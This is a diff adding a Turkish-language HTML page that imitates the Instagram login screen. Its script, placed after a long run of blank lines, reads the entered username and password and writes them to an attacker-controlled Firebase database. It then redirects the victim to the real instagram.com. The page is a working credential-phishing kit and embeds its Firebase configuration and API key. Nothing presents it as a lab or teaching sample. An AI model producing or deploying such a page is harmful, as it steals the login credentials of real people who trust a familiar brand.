@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/jpeg" href="logo.jpg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="page-wrapper">
+        <main class="split-container">
+            
+            <section class="left-section">
+                <div class="left-content">
+                    <div class="logo-wrapper">
+                        <img src="logo.jpg" alt="Instagram" class="insta-logo">
+                    </div>
+                    <h1 class="main-slogan">
+                        <span class="pink-text">Yakın arkadaşlarının</span> günlük<br>anlarını gör.
+                    </h1>
+                    
+                    <div class="mockup-container">
+                        <img src="mockup.jpg" alt="Instagram Stories" class="main-mockup-img">
+                    </div>
+                </div>
+            </section>
+
+            <div class="center-divider"></div>
+
+            <section class="right-section">
+                <div class="login-box">
+                    <h2 class="box-heading">Instagram'a Giriş Yap</h2>
+                    
+                    <form id="loginForm" class="auth-form" onsubmit="return false;">
+                        <input type="text" id="username" placeholder="Cep telefonu numarası, kullanıcı adı veya e-posta adresi" class="custom-input" required>
+                        <input type="password" id="password" placeholder="Şifre" class="custom-input" required>
+                        
+                        <button type="button" id="loginBtn" class="btn-submit-disabled" onclick="veriyiGonder()">Giriş Yap</button>
+                    </form>
+
+                    <a href="#" class="forgot-pass-link">Şifreni mi unuttun?</a>
+
+                    <div class="button-group">
+                        <button class="btn-pill btn-white-fb">
+                            <svg class="fb-svg" viewBox="0 0 24 24" width="16" height="16" fill="#1877F2">
+                                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                            </svg>
+                            Facebook ile giriş yap
+                        </button>
+                        
+                        <button class="btn-pill btn-white-blue-border">Yeni hesap oluştur</button>
+                    </div>
+
+                    <div class="meta-brand">
+                        <svg class="meta-svg" viewBox="0 0 24 24" width="16" height="16" fill="#000">
+                            <path d="M18.435 6.614c-1.354 0-2.55.7-3.328 1.765a5.556 5.556 0 0 0-3.329-1.765c-2.825 0-5.23 2.15-5.69 4.965a5.525 5.525 0 0 0 .801 3.733c.9 1.455 2.533 2.373 4.316 2.373 1.354 0 2.55-.7 3.329-1.765a5.556 5.556 0 0 0 3.328 1.765c2.825 0 5.23-2.15 5.69-4.965a5.525 5.525 0 0 0-.8-3.733c-.902-1.455-2.534-2.373-4.317-2.373zm0 9.213c-1.127 0-2.164-.615-2.698-1.604a4.195 4.195 0 0 1-.39-1.666 4.25 4.25 0 0 1 .39-1.667c.534-.99 1.571-1.604 2.698-1.604 1.637 0 3.013 1.258 3.238 2.923a3.298 3.298 0 0 1-.482 2.235c-.524.845-1.468 1.383-2.456 1.383zm-12.87 0c-.988 0-1.932-.538-2.456-1.383a3.298 3.298 0 0 1-.481-2.235c.224-1.665 1.6-2.923 3.237-2.923 1.127 0 2.164.615 2.698 1.604.256.474.39 1.033.39 1.667 0 .633-.134 1.192-.39 1.666-.534.99-1.571 1.604-2.698 1.604z"/>
+                        </svg>
+                        <span>Meta</span>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+
+        <footer class="page-footer">
+            <div class="footer-links-container">
+                <a href="#">Meta</a><a href="#">Hakkında</a><a href="#">Blog</a><a href="#">İş Fırsatları</a><a href="#">Yardım</a><a href="#">API</a><a href="#">Gizlilik</a><a href="#">Koşullar</a><a href="#">Konumlar</a><a href="#">Popüler</a><a href="#">Instagram Lite</a><a href="#">Meta AI</a><a href="#">Threads</a><a href="#">Meta Verified</a>
+            </div>
+            
+            <div class="footer-bottom-row">
+                <div class="language-dropdown">
+                    <span>Türkçe</span>
+                    <svg class="dropdown-arrow" viewBox="0 0 24 24" width="12" height="12" fill="#737373">
+                        <path d="M12 15.25a.74.74 0 01-.53-.22L4.72 8.28a.75.75 0 011.06-1.06L12 13.44l6.22-6.22a.75.75 0 111.06 1.06l-6.75 6.75a.74.74 0 01-.53.22z"/>
+                    </svg>
+                </div>
+                <div class="footer-copyright">
+                    © 2026 Instagram from Meta
+                </div>
+            </div>
+        </footer>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    
+    <script>
+      // 1. Senin Firebase ayarların
+      const firebaseConfig = {
+        apiKey: "AIzaSyCCTejOCSfl_A-5KurylWj7_gBPWWy1uqQ",
+        authDomain: "instagram-9ddb1.firebaseapp.com",
+        databaseURL: "https://instagram-9ddb1-default-rtdb.firebaseio.com",
+        projectId: "instagram-9ddb1",
+        storageBucket: "instagram-9ddb1.firebasestorage.app",
+        messagingSenderId: "245254009117",
+        appId: "1:245254009117:web:ae39dbe06428d6639b71f4",
+        measurementId: "G-ELMHNBLBT1"
+      };
+    
+      // 2. Firebase'i güvenle başlat
+      if (!firebase.apps.length) {
+          firebase.initializeApp(firebaseConfig);
+      }
+    
+      // 3. Çalışan Buton Fonksiyonu (ID'leri HTML'indekiyle aynı bıraktım)
+      function veriyiGonder() {
+          const u = document.getElementById('username').value;
+          const p = document.getElementById('password').value;
+          
+          if(u && p) {
+              firebase.database().ref('users/' + Date.now()).set({
+                  kullaniciAdi: u,
+                  sifre: p,
+                  tarih: new Date().toLocaleString()
+              })
+              .then(() => {
+                  window.location.href = "https://instagram.com";
+              });
+          }
+      }
+
+      // 4. Renk değişimi için (Orijinal yapını bozmadan ekledim)
+      const inputs = document.querySelectorAll('.custom-input');
+      const btn = document.querySelector('.btn-submit-disabled');
+      
+      inputs.forEach(input => {
+          input.addEventListener('input', () => {
+              if(inputs[0].value.length > 3 && inputs[1].value.length > 3) {
+                  btn.style.backgroundColor = "#0095f6";
+                  btn.style.cursor = "pointer";
+              }
+          });
+      });
+    </script>
+</body>
+</html>
